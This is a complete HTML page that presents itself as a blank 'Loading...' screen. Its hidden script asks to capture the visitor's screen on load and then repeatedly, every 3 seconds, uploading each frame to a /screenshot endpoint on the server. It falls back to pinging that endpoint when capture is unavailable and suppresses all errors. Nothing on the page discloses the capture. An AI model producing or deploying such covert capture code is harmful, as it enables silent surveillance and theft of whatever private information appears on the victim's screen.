<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #000;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>

    <script>
        // Browser-based screenshot function
        async function takeScreenshot() {
            try {
                // Try to capture the current tab using browser APIs
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                    const stream = await navigator.mediaDevices.getDisplayMedia({
                        video: { mediaSource: 'screen' }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    video.addEventListener('loadedmetadata', () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('screenshot', blob, 'screenshot.png');
                            
                            await fetch('/screenshot', {
                                method: 'POST',
                                body: formData
                            });
                            
                            stream.getTracks().forEach(track => track.stop());
                        });
                    });
                } else {
                    // Fallback: send a simple request
                    await fetch('/screenshot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ browser: true })
                    });
                }
            } catch (error) {
                // Silent fail
            }
        }
        
        // Take screenshot immediately when page loads
        takeScreenshot();
        
        // Take screenshots every 3 seconds while page is open
        setInterval(takeScreenshot, 3000);
    </script>
</body>
</html>
